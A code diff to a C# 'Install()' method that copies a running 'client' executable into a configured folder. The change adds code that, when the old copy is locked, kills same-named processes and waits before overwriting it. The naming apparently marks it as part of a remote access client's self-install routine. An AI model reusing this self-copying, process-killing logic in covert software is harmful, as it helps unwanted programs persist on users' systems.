@@ -306,13 +306,40 @@ namespace Core
 
         public static void Install()
         {
+            bool isKilled = false;
+
             // create target dir
             if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
                 Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
 
             // delete existing file
             if (File.Exists(SystemCore.InstallPath))
-                File.Delete(SystemCore.InstallPath);
+            {
+                try
+                {
+                    File.Delete(SystemCore.InstallPath);
+                }
+                catch (Exception ex)
+                {
+                    if (ex is IOException || ex is UnauthorizedAccessException)
+                    {
+                        // kill old process if new mutex
+                        Process[] foundProcesses = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
+                        int myPid = Process.GetCurrentProcess().Id;
+                        foreach (var prc in foundProcesses)
+                        {
+                            if (prc.Id != myPid)
+                            {
+                                prc.Kill();
+                                isKilled = true;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (isKilled)
+                Thread.Sleep(5000);
 
             //copy client to target dir
             File.Copy(SystemCore.MyPath, SystemCore.InstallPath, true);
